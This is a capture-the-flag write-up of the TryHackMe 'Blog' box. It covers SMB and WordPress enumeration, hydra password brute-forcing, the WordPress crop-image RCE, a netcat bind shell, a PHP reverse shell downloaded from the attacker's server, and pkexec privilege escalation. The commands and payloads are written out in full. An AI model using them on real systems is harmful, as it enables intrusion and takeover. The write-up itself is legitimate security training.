---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/blog/","tags":["CTF","write-up","#SUID","#wordpress","#RCE"]}
---


---
![Pasted image 20240926172149.png|200](/img/user/attachments/Pasted%20image%2020240926172149.png)


> [!info] Description
> Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!
> Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...
> **In order to get the blog to work with AWS, you'll need to add 10.10.208.110 blog.thm to your /etc/hosts file.**
> _Credit to [Sq00ky](https://tryhackme.com/p/Sq00ky) for the root privesc idea ;)_



---
# Active reconnaissance
## Enum ports and services
Run en general scan
`sudo nmap 10.10.208.110 -n -Pn -sS --open --min-rate 5000 -vvv -p-`
```c
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 61
80/tcp  open  http         syn-ack ttl 61
139/tcp open  netbios-ssn  syn-ack ttl 61
445/tcp open  microsoft-ds syn-ack ttl 61
```

---
# Vuln analysis
Run a focused scan
`sudo nmap 10.10.208.110 -sCV -p 22,80,139,445`
## Port 22
```c
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
```
## Port 139
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

## Port 445
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```c
Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2024-09-23T21:54:58+00:00
|nbstat: NetBIOS name: BLOG, NetBIOS user: , NetBIOS MAC: (unknown)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-09-23T21:54:58
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|clock-skew: mean: 0s, deviation: 1s, median: 0s
```
### Enum
From smbclient
![Pasted image 20240924102211.png](/img/user/attachments/Pasted%20image%2020240924102211.png)

From enum4linux
Known Usernames .. **administrator, guest, krbtgt, domain admins, root, bin, none**

```
------------------Password Policy Information for 10.10.208.110
   [+] Attaching to 10.10.208.110 using a NULL share
   [+] Trying protocol 139/SMB...
  
   [+] Found domain(s):
  
	 [+] BLOG
	 [+] Builtin
 
  [+] Password Info for Domain: BLOG

     [+] Minimum password length: 5
     [+] Password history length: None
     [+] Maximum password age: 37 days 6 hours 21 minutes
     [+] Password Complexity Flags: 000000

         [+] Domain Refuse Password Change: 0
         [+] Domain Password Store Cleartext: 0
         [+] Domain Password Lockout Admins: 0
         [+] Domain Password No Clear Change: 0
         [+] Domain Password No Anon Change: 0
         [+] Domain Password Complex: 0

     [+] Minimum password age: None
     [+] Reset Account Lockout Counter: 30 minutes
     [+] Locked Account Duration: 30 minutes
     [+] Account Lockout Threshold: None
     [+] Forced Log off Time: 37 days 6 hours 21 minutes
```

[+] Retrieved partial password policy with rpcclient:
 Password Complexity: Disabled
 Minimum Password Length: 5

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN **Administrators** (Local Group)
**Users Guests \Power Users \Account Operators \Server Operators \Print Operators**
[+] Enumerating users using SID S-1-5-21-3132497411-2525593288-1635041108 and logon username '', password ''
 S-1-5-21-3132497411-2525593288-1635041108-501 BLOG **nobody** (Local User)
 **none**
  [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
 S-1-22-1-1000 Unix User **bjoel** (Local User)
 S-1-22-1-1001 Unix User **smb** (Local User)
### Connecting
As we can read to `BillySMB` resource we'll connect to it.
```shell
smbclient //10.10.179.26/BillySMB -N
```
Exec `dir` to list files
![Pasted image 20240924110931.png|500](/img/user/attachments/Pasted%20image%2020240924110931.png)
To download all
```shell
prompt
mget *
```
We have:
An image
A piece if a video (Taylor Swift - I Knew You Were Trouble)
A link of a youtube video in a qrcode (Billy Joel - We Didn't Start the Fire (Official HD Video)).
![Pasted image 20240924111223.png|300](/img/user/attachments/Pasted%20image%2020240924111223.png)
Extract some information like the song names and the singer
## Port 80
**Apache httpd 2.4.29** ((Ubuntu))
**WordPress 5.0**

80/tcp  open  http        **Apache httpd 2.4.29** ((Ubuntu))
|http-generator: **WordPress 5.0**
|http-server-header: Apache/2.4.29 (Ubuntu)2
|http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry
|/wp-admin/
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
### Modifing etc-hosts
 ```shell
sudo nano /etc/hosts
```
And add
![Pasted image 20240923190019.png|400](/img/user/attachments/Pasted%20image%2020240923190019.png)
![Pasted image 20240923190145.png|500](/img/user/attachments/Pasted%20image%2020240923190145.png)
### Robots.txt
![Pasted image 20240924151003.png](/img/user/attachments/Pasted%20image%2020240924151003.png)
### Theme
After executing `wpscan ` 
`wpscan --url http://blog.thm:80`
we get an out of date version of theme **twentytwenty**
/blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: '**Version: 1.3**'
http://blog.thm/wp-content/themes/twentytwenty/readme.txt

### atom

---

### wp-admin admin-ajax php
http://blog.thm/wp-admin/admin-ajax.php
![Pasted image 20240924151247.png|400](/img/user/attachments/Pasted%20image%2020240924151247.png)

### Uploads
From nikto scan we know uploads directory
http://blog.thm/wp-content/uploads/
![Pasted image 20240924151430.png|300](/img/user/attachments/Pasted%20image%2020240924151430.png)

### wp-admin -> wp-login
Tring to connect `wp-admin` we are redirect to `wp-login`
![Pasted image 20240924151208.png|500](/img/user/attachments/Pasted%20image%2020240924151208.png)
After a manual test of the few words obtained from the enumetarion we know that the users `bjoel` and `kwheel` exist
![Pasted image 20240924195239.png|200](/img/user/attachments/Pasted%20image%2020240924195239.png)
### wp-includes
# Exploitation
## CVE-2023-48795 (Fail)

> [!cite] NIST CVE-2023-48795
> This vulnerability has been modified since it was last analyzed by the NVD. It is awaiting reanalysis which may result in further changes to the information provided.

javascript medium 10.10.63.203:22 "Vulnerable to Terrapin"
The system is vulnerable to this vulnerability but we need an ssh session active, so this vector is **nonviable**.
## Brute Force to port 22 (fail)
```shell
hydra -t 10 -vV -f -l bjoel -P /usr/share/wordlists/rockyou.txt 10.10.203.209 ssh
```
No results.
## Brute force to wp-login
Using `bjoel` and `kwheel`
With bjoel we have nothing but with `kwheel` we **found** the password
```shell
hydra -f -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.130.200 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -vV -t 50
```
![Pasted image 20240925194105.png](/img/user/attachments/Pasted%20image%2020240925194105.png)
## CVE-2019-8943 CVE-2019-8942

> [!cite] NIST CVE-2019-8943
> WordPress through 5.0.3 allows Path Traversal in wp_crop_image(). An attacker (who has privileges to crop an image) can write the output image to an arbitrary directory via a filename containing two image extensions and ../ sequences, such as a filename ending with the .jpg?/../../file.jpg substring.

> [!cite] NIST CVE-2019-8942
> WordPress before 4.9.9 and 5.x before 5.0.1 allows remote code execution because an `wp_attached_file` Post Meta entry can be changed to an arbitrary string, such as one ending with a .jpg?file.php substring. An attacker with author privileges can execute arbitrary code by uploading a crafted image containing **PHP code in the Exif metadata**. Exploitation can leverage CVE-2019-8943.

In the research of vulnerabilities we found this
https://github.com/hadrian368
This is just an example image containing the php code on metadata
![Pasted image 20240926112923.png|400](/img/user/attachments/Pasted%20image%2020240926112923.png)
### Executing the exploit
Clone the repo and execute the exploit
```shell
git clone https://github.com/hadrian3689/wordpress_cropimage
cd wordpress_cropimage
python3 wp_rce.py -t http://blog.thm/ -u kwheel -p xxxxx -m twentytwenty
```
![Pasted image 20240926113743.png|600](/img/user/attachments/Pasted%20image%2020240926113743.png)
We can run commands on the system [[RCE\|RCE]]. We have to go the browser or BurpSuite and run the payload `http://blog.thm/rse.php?0=id`
We could don't have an output readable.
### Testing RCE (optional)
I tested if the [[RCE\|RCE]] is working.
On the attacker machine I set an `icmp` listener using `tcpdump`.
```shell
sudo tcpdump ip proto \\icmp -i tun0
```
![Pasted image 20240926114744.png|500](/img/user/attachments/Pasted%20image%2020240926114744.png)
On the victim machine, to send a ping (just 2 packets) to my machine, run
`http://blog.thm/rse.php?0=ping 10.6.2.59 -c 2/`
but to avoid problems the url encoded: 
`http://blog.thm/rse.php?0=ping+10.6.2.59+-c+2/`
![Pasted image 20240926115124.png|500](/img/user/attachments/Pasted%20image%2020240926115124.png)
Works, we effectively are executing commands on the system.
### Bind shell
After try some revershell with negative results, I decided execute an bind shell and works.
To run the nc as listener, on the browser or burpSuite go to
`http://blog.thm/rse.php?0=mkfifo /tmp/f; nc -lvnp 4949 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f/`
Url encoded.
`http://blog.thm/rse.php?0=mkfifo+/tmp/f%3b+nc+-lvnp+4949+<+/tmp/f+|+/bin/sh+>/tmp/f+2>%261%3b+rm+/tmp/f/`
Example on Burpsuite
![Pasted image 20241116145944.png](/img/user/attachments/Pasted%20image%2020241116145944.png)
Example on browser
![Pasted image 20241116175643.png](/img/user/attachments/Pasted%20image%2020241116175643.png)

On the attacker machine run this to connect to the listener.
```shell
rlwrap nc 10.10.43.165 4949
```
![Pasted image 20240926115820.png|400](/img/user/attachments/Pasted%20image%2020240926115820.png)
### Reverse shell php (optinal)
We have a shell, now, to get a better revershell I upload a php revershell to the system `rev_shell_1.php`.
We have the file on our system and run a python server
```python
python -m http.server 4545
```

On the victim shell
```shell
wget http://10.6.2.59:4545/rev_shell_1.php
```

Start the revershell listener on the attacker machine
```shell
rlwrap nc -lnvp 5151
```
Now go to the url `http://blog.thm/rev_shell_1.php/`
And we have a revershell
![Pasted image 20240926120521.png|400](/img/user/attachments/Pasted%20image%2020240926120521.png)

---
# Privilege Escalation
## SUID

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



> [!cite] NIST-CVE-2021-4034
> A local privilege escalation vulnerability was found on polkit's **pkexec** utility. The pkexec application is a **setuid** tool designed to allow unprivileged users to **run commands as privileged users** according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

We have `pkexec`with SUID the bit enabled.
The exploit https://github.com/Almorabea/pkexec-exploit
```shell
wget https://raw.githubusercontent.com/Almorabea/pkexec-exploit/refs/heads/main/CVE-2021-4034.py
```
Or the code [[CVE-2021-4034-exploit\|CVE-2021-4034-exploit]]

And transfer to the victim machine

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Transfer files
Using **Python**, in the folder that contain the file to send **on the source machine.** E.g. `file.txt` #flashcard
```python
python -m http.server 4545
```
<!--ID: 1728611164654-->

On the destination machine
```shell
wget http://IP_SOURCE_MACHINE:4545/file.txt
```

</div></div>


Run the exploit
```shell
python3 CVE-2021-4034.py
```


</div></div>

We are root
![Pasted image 20240926170025.png|400](/img/user/attachments/Pasted%20image%2020240926170025.png)

Searching the user flag
```shell
find / -type f -iname user.txt
```
![Pasted image 20240926171656.png|400](/img/user/attachments/Pasted%20image%2020240926171656.png)

And finally  the root flag
Searching the user flag
```shell
find / -type f -iname root.txt
```
![Pasted image 20240926171935.png|400](/img/user/attachments/Pasted%20image%2020240926171935.png)


---
